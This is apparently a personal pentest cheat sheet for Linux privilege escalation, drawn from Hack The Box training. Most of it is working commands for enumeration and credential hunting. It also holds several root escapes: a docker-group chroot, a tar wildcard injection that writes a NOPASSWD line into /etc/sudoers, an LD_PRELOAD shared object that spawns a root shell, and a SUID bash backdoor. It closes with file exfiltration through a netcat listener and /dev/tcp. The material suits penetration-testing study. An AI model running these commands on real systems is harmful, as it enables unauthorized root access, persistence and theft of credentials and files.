# Linux Priviledges Escalation

## If the host is running a webapp

	Go look at the webapp dir to find configs and he code
	Go look at the database
	Look at the configs of the other apps running: ftp, mails, etc

## Gather Basic Informaiton

	whoami - what user are we running as
	id - what group does our user belong to
		if we are in the lxd we might create a container to get root
		if we are in docker group we can do:
			docker run run -v /:/mnt --rm -it ubuntu chroot /mnt bash to mount the root filesystem and escalate
		find / -group <group_name> 2>/dev/null	finds files that belong to a specific group
	uname -a - Get kernel version and OS architecture. Maybe it is a vulnerable kernel
		Check the date the kernel is compiled if it's old, there may be some vulns that havent been patched
	hostname - what is the server named. can we gather any info from the naming convention
	ifconfig of ip a - what subnet did we land in, does the host have additional NICs in other subnets
	sudo -l - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell.
		if we can run a binary with sudo check which can be exploit in https://gtfobins.github.io/

## Gather More Basic Infomation

	cat /etc/sudoers
	find / -type f -user $usersname 2>/dev/null - find all files that belong to a user
	cat /etc/os-release - operating system and version
	echo $PATH - check what commands can and are been runned
	env - check any env variable for sensitive information
	cat /etc/lsb-release - Get kernel version. Maybe it is a vulnerable kernel. Search google for exploit for the kernel
	lscpu - Get information about the host architecture and cpu
	cat /etc/shells - Get what shells exist on the server. The shell the user is using might be vulnurable
	lsblk - Get information on blocks and devices on the system. An unmounted drive my contain senstive information
	cat /etc/fstab - Get information on blocks and devices on the system. An unmounted drive my contain senstive information
	route - What other networks are available
	arp -a - Check what other hosts the target has been communication with

## Gather More Basic Information

	cat /etc/passwd - check existing users
	cat /etc/group - check existing groups
	cat /etc/hosts
	getnet group <group_name> - check which members belong to an exinsting group
	lastlog - check the last logins in the system
	w - check the current login users

## Enumerate the home directory files that belong to the user and history files

Check if the users are stoing significant information and configurations

	find / -user root 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
	cat ./bash_history - Get the commands that have been executed by the user
	history - Get the commands that have been executed by the user (same as cat ./bash_history?)
	find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null - find history files that may have been created by services or scripts
	ls -la /etc/cron.daily/ - check the schedule jobs
	find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" - find proc files that can give more information about the system

	Also do a quick check in any weird file in the home directory

## Get all Hidden Files, Directories and temp files

	find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
	find / -type d -name ".*" -ls 2>/dev/null
	ls -l /tmp /var/tmp /dev/shm

## Services

Check which services are in the system. They may be vulnurable to some exploit

	apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list - check packages installed
	sudo -V - check sudo version, old versions may have exploits
	for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done - check which binaries in the system maybe exploited
	find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null - check config files for password, etc
	find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" - scripts may have wrong priveledges, and may have other valuable information
	ps -ef --forest - Show all processes
	ps aux | grep root - check which services are beeing run by root
	ss -lantp - check open ports
				Test them with wget and port forwarding (like chisel)

## Credential Hunting

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files.

The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access.
Look for dabases runnings and grep the stored files (possibly also doing a strings command), to try to find the hashed passwords

grep -ri 'password'
grep -ri 'admin'

Check .ssh keys, and ssh known_hosts

	ls ~/.ssh

## Check priveledges

Check files that have setuid for root

	find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

Check for files for the setgroupid

	find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

We might be able to use gtfobins if one of these commands are allowed to run as root

https://gtfobins.github.io/

## Check PATH abuse

If some script is running with sudo and we can change the PATH var, then we can use it to run commands as sudo, for example:

	touch ls
	echo 'echo "PATH ABUSE!!"' > ls
	chmod +x ls
	PATH=.:${PATH}
	export PATH
	echo $PATH

If ls is then called by the root user, or an user with sudo priveleges, we execute commands with those privileges

## Check for Wildcard abuse

If commands are being runned in sudo that contain wildcards like *, we may be able to inject commands that will be run as sudo example:

	a cron with:

	mh dom mon dow command
	*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *

	then in the dir /home/htb-student we do the following commands:

	echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
	echo "" > "--checkpoint-action=exec=sh root.sh"
	echo "" > --checkpoint=1

	the two --checkpoints arguments will be added to the tar * and execute the root.sh script as sudo
	Simple trick behind this technique is that when using shell wildcards, especially asterisk (*), Unix shell will interpret files beginning with hyphen (-) character as command line arguments to executed command/program.

Commands susceptible to this are:

	tar
	chown
	chmod
	rsync
	7z
	zip

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

https://www.exploit-db.com/papers/33930

## Check if we are in a restricted shell

	echo $SHELL		returns the default shell
	echo $0		returns the current shell

If it is a restricted shell we might need to escape

## Enumerate Capabilities

	find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

Some capabilites set to a process my allow to escalate to root

## Check Shared libraries

If by doing sudo -l , the env variable has env_keep+=LD_PRELOAD and we can use a command as sudo like /usr/sbin/apache2, and this command doesnt have a gtfobin, we can use the LD_PRELOAD of the librarie to load code before the executing of the command as sudo like:

	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>

	void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
	}

Compiling it like 

	gcc -fPIC -shared -o root.so root.c -nostartfiles

And then doing

	sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

	Remember to specify the complete path to root.so

## If we find a way to run a command as root

	We can do chmod +s /bin/bash and then we the unprivilege account do /bin/bash -p to get a bash as root


## Run linPEAS script

	https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
	
	./linpeas.sh

## Tips and Tricks

Copy files from remote to host

```shell
#start nc
nc -nvlp 9001 > [filename]
#cat the file we want to receive
cat [filename] > /dev/tcp/[our_ip]/9001
```

## Relevante Information

	https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
	https://gtfobins.github.io/